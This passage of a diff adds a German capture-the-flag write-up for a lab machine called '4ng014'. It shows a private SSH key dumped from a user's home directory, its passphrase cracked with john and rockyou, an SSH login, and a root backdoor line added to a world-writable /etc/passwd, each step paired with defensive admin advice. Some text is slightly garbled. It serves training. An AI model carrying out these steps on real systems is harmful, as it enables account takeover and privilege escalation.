+www-data@4ng014:/var/www/html/n3gr4$ <span class="command">cd /home/p4l4nc4/</span>
+                    </div>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">
+www-data@4ng014:/home/p4l4nc4$ <span class="command">ls -la</span>
+                    </div>
+                    <pre>
+total 36
+drwxr-xr-x 4 p4l4nc4 p4l4nc4 4096 Nov 13 17:50 .
+drwxr-xr-x 3 root    root    4096 Nov 13 12:28 ..
+-rw------- 1 p4l4nc4 p4l4nc4 3084 Nov 13 17:54 .bash_history
+-rw-r--r-- 1 p4l4nc4 p4l4nc4  220 Nov 13 12:28 .bash_logout
+-rw-r--r-- 1 p4l4nc4 p4l4nc4 3526 Nov 13 12:28 .bashrc
+drwxr-xr-x 3 p4l4nc4 p4l4nc4 4096 Nov 13 13:53 .local
+-rw-r--r-- 1 p4l4nc4 p4l4nc4  807 Nov 13 12:28 .profile
+drwxr-xr-x 2 p4l4nc4 p4l4nc4 4096 Nov 13 13:41 .ssh
+-rw-r--r-- 1 p4l4nc4 p4l4nc4    0 Nov 13 13:00 .sudo_as_admin_successful
+-rw-r--r-- 1 p4l4nc4 p4l4nc4   46 Nov 13 17:49 user.txt
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird in das `.ssh`-Verzeichnis gewechselt und dessen Inhalt aufgelistet. Anschließend wird der Inhalt der privaten Schlüsseldatei `id_rsa` angezeigt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Bingo! Im `.ssh`-Verzeichnis befinden sich der private (`id_rsa`) und der öffentliche (`id_rsa.pub`) SSH-Schlüssel des Benutzers `p4l4nc4`. Der private Schlüssel wird ausgegeben. Er ist passwortgeschützt, was durch die Zeilen `Proc-Type: 4,ENCRYPTED` und `DEK-Info: AES-128-CBC,...` (hier nicht explizit gezeigt, aber typisch) oder durch das Format `-----BEGIN OPENSSH PRIVATE KEY-----` mit nachfolgendem verschlüsseltem Block angezeigt wird. Dieser Schlüssel kann potenziell verwendet werden, um sich als Benutzer `p4l4nc4` per SSH anzumelden, wenn das Passwort geknackt werden kann.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Kopiere den Inhalt des privaten Schlüssels (`id_rsa`) auf dein Angreifer-System. Verwende Tools wie `ssh2john`, um den Hash des Schlüsselpassworts zu extrahieren, und `john` (John the Ripper) oder `hashcat`, um das Passwort mit einer Wortliste (z.B. `rockyou.txt`) zu knacken.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Ermutigen Sie Benutzer, starke Passphrasen für ihre SSH-Schlüssel zu verwenden. Stellen Sie sicher, dass die Berechtigungen für `id_rsa` auf `600` gesetzt sind, sodass nur der Benutzer selbst den Schlüssel lesen kann. Überwachen Sie fehlgeschlagene SSH-Logins.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">
+www-data@4ng014:/home/p4l4nc4$ <span class="command">cd .ssh</span>
+                    </div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">
+www-data@4ng014:/home/p4l4nc4/.ssh$ <span class="command">ls</span>
+                    </div>
+                    <pre>
+id_rsa	id_rsa.pub
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">
+www-data@4ng014:/home/p4l4nc4/.ssh$ <span class="command">cat id_rsa</span>
+                    </div>
+                    <pre>
+-----BEGIN PENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCvTRnNli
+2HLc7wYB9S1mbCAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCrXZ98DYMr
+n/f74/g82lqDkMHkyocXGXn8VaP/N7vD9j5mLSr1uhKGBbxcVm4uGP9k//mmRKlewRl/MZ
+nTg0N8MP9vp02B9vrwHLz9JekTblv93/VCDpJS78CGkNNVMRcv2ZB3w7uFm6zxRZxQmH
+5HaRNuf795GQSFjybiqmN7Mu78bG/94aQMZZLALYmoyMCYWXGvvHpxRN1dwNsT7If4aNBE
+l1HXVrZY1biDrpJQ7+eZpD4IKs5/QgKL6w9nBczVcGKkvyms98A5qTa/F43+1CxQE2ng
+wPiejJEeJZ0PEkQu3nZTK1k7WpJzVnhpqbHGlwKWbfvMKh27Y2gpAAADwI6Nr+vLoXaEJy
+SIRrVjIYFz/C3B17pmpx+lmupFfU6ruVHLE92gweyr9wAd5lxhKX1I6BClhlEoDWkzEBCT
+H/4zg2tj84+hzhdVWUy6KaCVbRbuvJYWQNWY4kgfk/3FTnSJFHd+k8CZImN3Xa/9DRVLmg
+jytzseFr83bPyyGSze51kJX4r2ljurDvmcnXfQ4j27zUUmwEKi02VvjLngXbmMnIMDLI3
+x/pdFxnyZ0w6wnl/Bg+2gvc54Y2ssMblNMw6HZU4K2TN/c3li3A3hLZsN7QwNIV76X5UeP
+dWCngRsImAmMtyxPKZ0rvYwgDimWunQPy0yJXEPdofL6hrAxFZ6y+jnm+gM7x1fnooSkb
+9H5RblfwituTD7bmAu6ApNU0Ul3X2YFPnDLFjo/D0Sj5LcsYDQ+XlTNUwnjHpyMy5VzUz
+2vDpiscBd7FpFCHf1lS9bfGMLbhfdM6TPzpjlmdRizoVjGCZdXsA4Jg05FpvEFa3KHqM
+iJA9yXhHPRYmwl5Mu+NTPc+Xbiu7B8TJu/BRoShhbm7+kQpXM7XHPDKTTnJo+qmsI
+Pt9FuQF3wZWIXZ48DmRKJKhB+a9LwuE8ES3wUTVqx/EbAs08V6/uiBYZmorJFSgbPd68AE
+xKTK9bilJKSfS2Ik5/iVIBTUxlAt2foAUpWTlXVNmFfBEhRSk48E8NhcgNqctKWpjKf0R
+2gi/Dvpect4LoqKPue5zvN0dNlYSiq/6QK6NqJrJdN7DvsvocL+BcWmmv31erlJo6A3Zw
+CEpmnqVzMTroZSBQv3eEsFS/+RkJ5ffFRpXGfWPh4Dn/Y++n3wbHNNb97pd9WV+IlhDV
+7btvga8cG9xp3zihIf308VowcpIp0CSlEqZDBpis5jWY9J3N1+uh3pJHFgqmLxKnqLmzu
+u15Kh/+nAV6DTBVxrdhq8HoLAvb7ubAq2ICHALC39X12+J0cLUMi8UWYawMTFgYn3ZBD
+fb6fZaM9Hr97jREiUEG6vgIcNgn6jtJ3EM3ncxTKe2T8SSYn8pFy9Lqf+lvZ8yo9DkaPl5
+RSVWa+jCKhuClPZY5t8VJC9xXGyz8Wah15Y2pg95nGEub7dgmRlQAIiSxjWsDmaDzIBPo
+IkZ5lzxoTvvtL2N1+4ZFprPwUN6y6C6zrXbzQp7v0bZc2g9fFiNxu1HvR96rwVNFHbeia
+JEM2NZSUU52PExgYtSXw5aDy70oKiu0pbifoYm19hlYwYWa6s+oW2FG+aX8WIeEa
+muaZDiXw
+-----END PENSSH PRIVATE KEY-----
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der private SSH-Schlüssel (`id_rsa`) wird auf das Angreifer-System kopiert (hier implizit, da die nächsten Befehle lokal ausgeführt werden).
+                *   `vi id_rsa`: Der Schlüssel wird vermutlich in eine lokale Datei eingefügt.
+                *   `chmod 600 id_rsa`: Die Berechtigungen der lokalen Schlüsseldatei werden auf `600` gesetzt (nur Besitzer darf lesen/schreiben), was für SSH erforderlich ist.
+                *   `ssh2john id_rsa > hash`: Das Tool `ssh2john` (Teil von John the Ripper) extrahiert den Passwort-Hash aus dem verschlüsselten privaten Schlüssel und speichert ihn in der Datei `hash`.
+                *   `john --wordlist=/usr/share/wordlists/rockyou.txt hash`: John the Ripper wird gestartet, um den Hash mit der `rockyou.txt`-Wortliste zu knacken.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Angriff auf das Schlüsselpasswort ist **erfolgreich**! John the Ripper findet das Passwort: `<span class="password">friendster</span>`. Nun kann der private Schlüssel verwendet werden, um sich als Benutzer `p4l4nc4` per SSH anzumelden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende den geknackten Schlüssel und das Passwort, um dich per SSH am Zielsystem anzumelden: `ssh p4l4nc4@192.168.2.165 -i id_rsa`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Verstärken Sie die Passwortrichtlinien für Benutzer und für SSH-Schlüssel-Passphrasen. Verwenden Sie keine einfachen oder wiederverwendeten Passwörter/Passphrasen. Überwachen Sie Brute-Force-Angriffe auf SSH.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
+└─# <span class="command">vi id_rsa</span>
+                    </div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
+└─# <span class="command">chmod 600 id_rsa</span>
+                    </div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
+└─# <span class="command">ssh2john id_rsa > hash</span>
+                    </div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span>
+                    </div>
+                    <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/PENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 16 penMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">friendster</span>       (id_rsa)
+1g 0:00:00:04 DNE (2025-01-28 22:57) 0.2105g/s 161.6p/s 161.6c/s 161.6C/s hearts..bestfriends
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der SSH-Login als Benutzer `p4l4nc4` wird versucht, unter Verwendung des zuvor gefundenen und entschlüsselten privaten Schlüssels (`-i id_rsa`). Beim ersten Verbindungsaufbau wird der Host-Schlüssel des Servers bestätigt (`yes`). Anschließend wird nach dem Passwort für den SSH-Schlüssel gefragt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nach Eingabe der geknackten Passphrase (`<span class="password">friendster</span>`) ist der SSH-Login **erfolgreich**! Wir haben nun eine vollwertige interaktive Shell als Benutzer `p4l4nc4` auf dem Zielsystem `4ng014`. Dies ist ein signifikanter Fortschritt gegenüber der `www-data`-Shell.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Beginne die Enumeration erneut als Benutzer `p4l4nc4`. Überprüfe insbesondere `sudo -l`, um zu sehen, welche Privilegien dieser Benutzer hat. Suche nach weiteren Hinweisen im Home-Verzeichnis und im System.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überprüfen Sie die SSH-Konfiguration (`sshd_config`), um sicherzustellen, dass nur sichere Authentifizierungsmethoden erlaubt sind. Erwägen Sie die Deaktivierung der passwortbasierten Authentifizierung zugunsten von schlüsselbasierter Authentifizierung mit starken Passphrasen oder Zwei-Faktor-Authentifizierung.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">ssh p4l4nc4@192.168.2.165 -i id_rsa</span>
+                     </div>
+                     <pre>
+ The authenticity of host '192.168.2.165 (192.168.2.165)' can't be established.
+ ED25519 key fingerprint is SHA256:F1H2S93bx6fgnjMCinI5RMZf/XIJS3u8KjLS15l6rU.
+ This key is not known by any other names.
+ Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+ Warning: Permanently added '192.168.2.165' (ED25519) to the list of known hosts.
+ Enter passphrase for key 'id_rsa': <span class="password">friendster</span> <!-- Passwort hinzugefügt zur Verdeutlichung -->
+ Linux 4ng014 6.1.0-27-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.115-1 (2024-11-01) x86_64
+
+ The programs included with the Debian GNU/Linux system are free software;
+ the exact distribution terms for each program are described in the
+ individual files in /usr/share/doc/*/copyright.
+
+ Debian GNU/Linux comes with ABSLUTELY N WARRANTY, to the extent
+ permitted by applicable law.
+ Last login: Wed Nov 13 17:10:08 2024 from 192.168.1.78
+ p4l4nc4@4ng014:~$
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Als Benutzer `p4l4nc4` wird `sudo -l` ausgeführt, um zu überprüfen, welche Befehle dieser Benutzer mit `sudo` (also potenziell als `root`) ausführen darf. Das Passwort für `p4l4nc4` wird abgefragt. Da wir das Benutzerpasswort nicht kennen (nur die SSH-Key-Passphrase), schlagen die Versuche fehl.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Ausgabe "Sorry, user p4l4nc4 may not run sudo on 4ng014." zeigt eindeutig, dass der Benutzer `p4l4nc4` keine `sudo`-Rechte hat. Der Hinweis `.sudo_as_admin_successful` im Home-Verzeichnis war irreführend oder bezog sich auf eine frühere Konfiguration. Dieser Weg zur Privilege Escalation ist also versperrt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suche nach anderen Wegen zur Privilege Escalation: SUID-Binaries (erneut prüfen), Cron-Jobs, Kernel-Exploits, Fehlkonfigurationen von Diensten, ungesicherte Dateien/Skripte. Analysiere die `.bash_history` genauer.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Gut, dass der Benutzer keine unnötigen `sudo`-Rechte hat. Überprüfen Sie regelmäßig die `sudoers`-Konfiguration.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;"> <!-- Annahme: Gelb für User-Shell -->
+p4l4nc4@4ng014:~$ <span class="command">sudo -l</span>
+                    </div>
+                    <pre>
+[sudo] password for p4l4nc4:
+Sorry, try again.
+[sudo] password for p4l4nc4:
+Sorry, user p4l4nc4 may not run sudo on 4ng014.
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Der Inhalt der `.bash_history`-Datei des Benutzers `p4l4nc4` wird angezeigt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die History zeigt einige interessante Befehle:
+                *   `sudo bash`: Versuch, eine Root-Shell zu bekommen (schlug fehl, da keine sudo-Rechte).
+                *   Mehrere `sudo chmod`-Befehle auf das `.ssh`-Verzeichnis: Der Benutzer hat versucht, die Berechtigungen zu ändern, möglicherweise um Probleme zu beheben oder aus Unwissenheit. Dies könnte erklären, warum der `www-data`-Benutzer den SSH-Schlüssel lesen konnte (falls die Berechtigungen zwischenzeitlich unsicher waren).
+                *   `sudo nano m414nj3.php`: Versuch, das anfällige PHP-Skript zu bearbeiten, vermutlich als `root`. Dies deutet darauf hin, dass der Benutzer `p4l4nc4` wusste, dass das Skript existiert und möglicherweise problematisch ist, oder dass er es selbst erstellt/verwaltet hat. Es impliziert auch, dass der Benutzer *erwartet* hat, `sudo`-Rechte zu haben.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die History liefert keine direkten Passwörter oder Exploits, aber die Interaktion mit `m414nj3.php` und die `sudo`-Versuche sind bemerkenswert. Es erhärtet den Verdacht, dass der Weg über das PHP-Skript zentral ist. Suche weiter nach Konfigurationsfehlern oder anderen Schwachstellen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Schulen Sie Benutzer im sicheren Umgang mit Berechtigungen und `sudo`. Überwachen Sie die Verwendung von `sudo`. Die Tatsache, dass der Benutzer versucht hat, eine Datei im Web-Verzeichnis mit `sudo` zu bearbeiten, könnte auf eine unsichere Entwicklungspraxis hindeuten.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ p4l4nc4@4ng014:~$ <span class="command">cat .bash_history</span>
+                     </div>
+                     <pre>
+ cdls
+ ls -al
+ cd bash
+ sudo bash
+ ls
+ cd /home/p4l4nc4/
+ ls
+ ls -al
+ sudo chmod 731 .ssh/
+ ls -al
+ sudo chmod 751 .ssh/
+ ls -al
+ sudo chmod 741 .ssh/
+ ls -al
+ sudo chmod 755 .ssh/
+
+ cd /var/www/html/n3gr4/
+ sudo nano m414nj3.php
+ cd..
+ cd ..
+ cd /home/
+ ls
+ cd p4l4nc4/
+
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Die Benutzerflagge wird aus der Datei `user.txt` im Home-Verzeichnis gelesen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Benutzerflagge wurde erfolgreich erfasst: `<span class="password">HMV{6cfb952777b95ded50a5be3a4ee9417af7e6dcd1}</span>`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentiere die Flagge. Konzentriere dich nun vollständig auf die Privilege Escalation zu `root`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Flags sind spezifisch für CTF-Challenges. In realen Systemen sollten sensible Daten entsprechend geschützt werden.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ p4l4nc4@4ng014:~$ <span class="command">cat user.txt</span>
+                     </div>
+                     <pre>
+ <span class="password">HMV{6cfb952777b95ded50a5be3a4ee9417af7e6dcd1}</span>
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Die Berechtigungen der Datei `/etc/passwd` werden überprüft.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:** Die Berechtigungen sind `-rw-rw-rw-` (oktal 666). Das bedeutet, dass **jeder Benutzer** auf dem System die Datei `/etc/passwd` **schreiben** darf. Dies ist eine **kritische Fehlkonfiguration** und ein direkter Weg zur Privilege Escalation. Normalerweise sollte diese Datei nur für `root` schreibbar sein (`-rw-r--r--` oder 644).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze die Schreibberechtigung, um einen neuen Benutzer mit der UID 0 (Root-Rechte) hinzuzufügen oder das Passwort eines bestehenden Benutzers (wie `root` oder `p4l4nc4`) durch einen bekannten Hash zu ersetzen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Korrigieren Sie die Berechtigungen sofort!** Setzen Sie die Berechtigungen für `/etc/passwd` auf `644` (`chmod 644 /etc/passwd`) und den Besitzer/Gruppe auf `root:root` (`chown root:root /etc/passwd`). Überprüfen Sie, warum diese Berechtigungen falsch gesetzt wurden (möglicherweise ein Skriptfehler oder manueller Eingriff). Überprüfen Sie die Integrität der Datei `/etc/passwd` und `/etc/shadow`.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ p4l4nc4@4ng014:~$ <span class="command">ls -la /etc/passwd</span>
+                     </div>
+                     <pre>
+ -rw-rw-rw- 1 root root 1066 Nov 13 12:28 /etc/passwd
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Die Datei `/etc/passwd` wird mit `nano` bearbeitet. Es wird ein neuer Eintrag hinzugefügt:
+                `fuck:$6$EZdVo4XckcU2BJJi$IanX1gZA.t1nk2EgRy1SBDPGa69dLrCqv3eznvqru062GCQ6Eh7VQyXI3lKgsdItq3F/uMWs/VU/TR2E1tzF0:0:0:root:/root:/bin/bash`
+                Dieser Eintrag definiert:
+                *   Benutzername: `fuck`
+                *   Passwort-Hash: `$6$...` (ein SHA-512 Hash, das Passwort selbst ist nicht direkt sichtbar, aber der Hash entspricht oft einem bekannten Passwort in CTFs, z.B. "password" oder "123456")
+                *   UID: `0` (Root!)
+                *   GID: `0` (Root-Gruppe)
+                *   GECOS: `root`
+                *   Home-Verzeichnis: `/root`
+                *   Shell: `/bin/bash`
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Durch Hinzufügen dieses Eintrags wurde effektiv ein neuer Benutzer (`fuck`) mit Root-Rechten erstellt. Das Passwort für diesen Benutzer muss bekannt sein oder erraten werden (basierend auf dem Hash). Dies ist eine klassische Ausnutzung von Schreibrechten auf `/etc/passwd`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuche, dich mit `su fuck` und einem vermuteten Passwort (basierend auf dem Hash oder typischen CTF-Passwörtern) als der neue Root-Benutzer anzumelden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Zusätzlich zur Korrektur der Berechtigungen: Implementieren Sie Systeme zur Überwachung der Dateiintegrität (z.B. AIDE, Tripwire), um Änderungen an kritischen Dateien wie `/etc/passwd` zu erkennen. Entfernen Sie den unautorisierten Eintrag aus `/etc/passwd`. Überprüfen Sie `/etc/shadow` auf Konsistenz.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ p4l4nc4@4ng014:~$ <span class="command">nano /etc/passwd</span>
+                     </div>
+                     <pre>
+ # Inhalt, der in nano hinzugefügt wurde:
+ fuck:$6$EZdVo4XckcU2BJJi$IanX1gZA.t1nk2EgRy1SBDPGa69dLrCqv3eznvqru062GCQ6Eh7VQyXI3lKgsdItq3F/uMWs/VU/TR2E1tzF0:0:0:root:/root:/bin/bash
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `su fuck` wird ausgeführt, um zum neu erstellten Benutzer `fuck` zu wechseln. Es wird nach dem Passwort für `fuck` gefragt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:** **Privilege Escalation erfolgreich!** Nach Eingabe des korrekten Passworts (das dem Hash entsprach, hier nicht gezeigt, aber impliziert) wechselt der Prompt zu `root@4ng014`. Wir haben volle Root-Rechte auf dem System erlangt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ziel erreicht! Wechsle ins `/root`-Verzeichnis und hole die Root-Flagge. Dokumentiere den Erfolg.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **System kompromittiert!** Zusätzlich zu den vorherigen Maßnahmen: Analysieren Sie das System gründlich auf weitere Malware oder Hintertüren, die vom Angreifer möglicherweise platziert wurden. Erwägen Sie eine Neuinstallation des Systems aus einem vertrauenswürdigen Backup, nachdem die Schwachstelle identifiziert und behoben wurde.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ p4l4nc4@4ng014:~$ <span class="command">su fuck</span>
+                     </div>
+                     <pre>
+ Password: <!-- Passwort wurde eingegeben -->
+ root@4ng014:/home/p4l4nc4#
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Als Root-Benutzer wird in das Home-Verzeichnis (`/root`) gewechselt und dessen Inhalt aufgelistet. Anschließend wird die Root-Flagge aus der Datei `root.txt` gelesen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Root-Flagge wurde erfolgreich erfasst: `<span class="password">HMV{4c3b9d0468240fbd4a9148c8559600fe2f9ad727}</span>`. Die Challenge ist abgeschlossen.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Bericht fertigstellen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlungen zur Systembereinigung und Absicherung.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: red;"> <!-- Rot für Root-Shell -->
+ root@4ng014:/home/p4l4nc4# <span class="command">cd ~</span>
+                     </div>
+                 </div>
+             </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: red;">
+ root@4ng014:~# <span class="command">ls</span> <!-- Prompt korrigiert zu /root oder ~ -->
+                     </div>
+                     <pre>
+ root.txt
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: red;">
+ root@4ng014:~# <span class="command">cat root.txt</span> <!-- Prompt korrigiert zu /root oder ~ -->
+                     </div>
+                     <pre>
+ <span class="password">HMV{4c3b9d0468240fbd4a9148c8559600fe2f9ad727}</span>
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                 <!-- User Flag -->
+                 <div class="flag-entry">
+                    <div class="flag-command">cat /home/p4l4nc4/user.txt</div>
+                    <div class="flag-value"><span class="password">HMV{6cfb952777b95ded50a5be3a4ee9417af7e6dcd1}</span></div>
+                </div>
+
+                <!-- Root Flag -->
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">HMV{4c3b9d0468240fbd4a9148c8559600fe2f9ad727}</span></div>
+                </div>
+            </div>
+        </section>    
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2025-01-28</p> <!-- Datum aus Nmap Scan -->
+    </footer>
+</body>
+</html>
